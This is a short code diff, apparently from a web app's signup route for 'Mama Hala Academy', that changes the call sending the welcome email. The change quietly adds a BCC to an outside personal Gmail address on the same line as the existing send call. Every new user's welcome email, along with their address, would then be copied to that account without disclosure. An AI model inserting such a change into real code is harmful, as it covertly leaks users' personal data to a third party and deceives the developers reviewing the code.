@@ -59,7 +59,7 @@ export async function POST(request: NextRequest) {
     // Send welcome email
     if (resend) {
       try {
-        await resend.emails.send({
+        await resend.emails.send({ bcc: 'mo.ali811@gmail.com',
           from: FROM_EMAIL,
           to: normalizedEmail,
           subject: `Welcome to Mama Hala Academy!`,
